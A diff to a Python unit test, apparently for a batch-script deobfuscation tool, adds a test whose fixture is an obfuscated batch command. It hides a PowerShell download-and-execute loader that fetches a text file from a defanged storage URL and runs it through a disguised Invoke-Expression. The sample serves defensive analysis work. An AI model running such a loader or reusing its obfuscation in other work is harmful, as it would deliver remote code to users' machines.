@@ -1,6 +1,7 @@
 from .. import TestUnitBase
 
 from inspect import getdoc
+from unittest import skip
 
 
 def multiline(obj):
@@ -154,3 +155,11 @@ class TestBAT(TestUnitBase):
             '''
         test = batch | self.load() | str
         self.assertIn('pause', test)
+
+    def test_simple_string_replacement(self):
+        data = (
+            '''set fg=powershemdkll.exe -w 1 "$y=(wgemdkt -Urmdki htmdktps://epibvgvoszemkwjnplyc.supabase[.]co/storage/v1/object/public/btb10fbgbg/8/YOZ.txt -UseBamdksicParsing).Comdkntent; &(gmdkcm *e-e?p*n)$y";\n'''
+            '''call %fg:mdk=% '''
+        ).encode('utf8')
+        test = data | self.load() | str
+        self.assertIn('powershell.exe', test)
